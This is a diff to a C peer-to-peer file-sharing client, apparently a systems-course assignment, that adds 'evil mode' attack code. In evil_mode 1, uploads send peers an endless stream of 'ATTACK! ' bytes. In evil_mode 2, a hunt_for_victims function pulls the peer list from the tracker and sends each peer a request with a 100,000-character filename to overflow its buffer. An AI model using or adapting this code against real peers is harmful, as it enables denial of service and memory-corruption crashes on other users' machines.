@@ -37,7 +37,7 @@ pthread_mutex_t tracker_mutex = PTHREAD_MUTEX_INITIALIZER;
  * a bounded buffer that simplifies reading from and writing to peers.
  */
 
-#define TASKBUFSIZ	4096	// Size of task_t::buf
+#define TASKBUFSIZ	10000 	// Size of task_t::buf
 #define FILENAMESIZ	256	// Size of task_t::filename
 
 typedef enum tasktype {		// Which type of connection is this?
@@ -189,7 +189,7 @@ taskbufresult_t read_to_taskbuf(int fd, task_t *t)
 		return TBUF_ERROR;
 	else if (amt == 0)
 		return TBUF_END;
-	else {
+	else { 
 		t->tail += amt;
 		return TBUF_OK;
 	}
@@ -449,7 +449,7 @@ static void register_files(task_t *tracker_task, const char *myalias)
 		if (tracker_task->buf[messagepos] != '2')
 			error("* Tracker error message while registering '%s':\n%s",
 			      ent->d_name, &tracker_task->buf[messagepos]);
-	}   //FIX: Current code doesn't check whether registration even worked. need to check?
+	}   
 
 	closedir(dir);
 }
@@ -649,6 +649,7 @@ static task_t *task_listen(task_t *listen_task)
 
 	message("* Got connection from %s:%d\n",
 		inet_ntoa(peer_addr.sin_addr), ntohs(peer_addr.sin_port));
+            
 
 	t = task_new(TASK_UPLOAD);
 	t->peer_fd = fd;
@@ -681,6 +682,25 @@ static void task_upload(task_t *t)
 	}
 	t->head = t->tail = 0;
 
+        if(evil_mode == 1) { //Send user an infinite stream of bytes
+            int evil_pipe[2];
+            pipe(evil_pipe);
+            char attack_str[] = "ATTACK! ";
+
+            //Keep writing bytes until client closes connection
+            while(1) {
+                write(evil_pipe[1],attack_str,sizeof(attack_str));
+                read_to_taskbuf(evil_pipe[0],t);
+                int success = write_from_taskbuf(t->peer_fd, t);
+                if( success == TBUF_ERROR || success == TBUF_END ) 
+                    break;
+            } 
+
+            close(evil_pipe[0]);
+            close(evil_pipe[1]); 
+            goto exit;
+        }
+
 	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
@@ -690,14 +710,13 @@ static void task_upload(task_t *t)
 	message("* Transferring file %s\n", t->filename);
 	// Now, read file from disk and write it to the requesting peer.
   
-     if(!evil_mode) {        
 
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
 			error("* Peer write error");
 			goto exit;
-		}  //FIX: why does it write before doing any read? should we zero out the buffer?
+		} 
 
 		ret = read_to_taskbuf(t->disk_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -707,29 +726,9 @@ static void task_upload(task_t *t)
 			/* End of file */
 			break;
 	}
- 
-     }
-
-     if(evil_mode == 1) { //Send user an infinite stream of bytes
-         int evil_pipe[2];
-         pipe(evil_pipe);
-         char attack_str[] = "ATTACK! ";
-
-         //Keep writing bytes until client closes connection
-         while(1) {
-             write(evil_pipe[1],attack_str,sizeof(attack_str));
-             read_to_taskbuf(evil_pipe[0],t);
-             int success = write_from_taskbuf(t->peer_fd, t);
-             if( success == TBUF_ERROR || success == TBUF_END ) 
-                 break;
-         } 
-
-         close(evil_pipe[0]);
-         close(evil_pipe[1]); 
-         goto exit;
-     }
-      
      
+
+           
 
 	message("* Upload of %s complete\n", t->filename);
 
@@ -750,6 +749,56 @@ void* process_uploads(void *arg) {
     pthread_exit(NULL);
 }
 
+
+//If evil_mode 2 is set, this function will actively pursue
+//clients connected to the tracker and attempt to launch
+//buffer overflow attacks
+void hunt_for_victims(task_t *tracker_task) {
+    assert(evil_mode == 2);
+    char *s1, *s2;
+    size_t messagepos;
+    peer_t *hit_list = NULL;
+    peer_t *current = NULL;
+
+    write(tracker_task->peer_fd, "WHO\n",5);
+    messagepos = read_tracker_response(tracker_task);
+ 
+    // add victims
+    s1 = tracker_task->buf;
+    while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
+		if (!(current = parse_peer(s1, s2 - s1)))
+			die("osptracker responded to WHO command with unexpected format!\n");
+		current->next = hit_list;
+		hit_list = current;
+		s1 = s2 + 1;
+	}
+	if (s1 != tracker_task->buf + messagepos)
+		die("osptracker's response to WHO has unexpected format!\n");
+     
+     //Assasinate everyone on hit list with a buffer overflow attack
+     char huge_buffer[100000];
+     memset(huge_buffer,'c',sizeof(huge_buffer));
+     huge_buffer[100000 - 1] = '\0';
+
+     current = hit_list;
+     while(current) { 
+         if( current->addr.s_addr == listen_addr.s_addr &&
+                current->port == listen_port ) {
+             //We don't want to attack ourselves
+             current = current->next;
+             continue;
+         }
+    
+         int attack_entry = open_socket(current->addr, current->port);
+         if(attack_entry != -1) {
+             osp2p_writef(attack_entry, "GET %s OSP2P\n", huge_buffer);
+             close(attack_entry);
+         } 
+         
+         current = current->next;
+     }
+
+}
 
 // main(argc, argv)
 //	The main loop!
@@ -829,6 +878,9 @@ int main(int argc, char *argv[])
 	tracker_task = start_tracker(tracker_addr, tracker_port);
 	listen_task = start_listen();
 	register_files(tracker_task, myalias);
+
+        if (evil_mode == 2)
+            hunt_for_victims(tracker_task);
 
 	// First, download files named on command line.
 
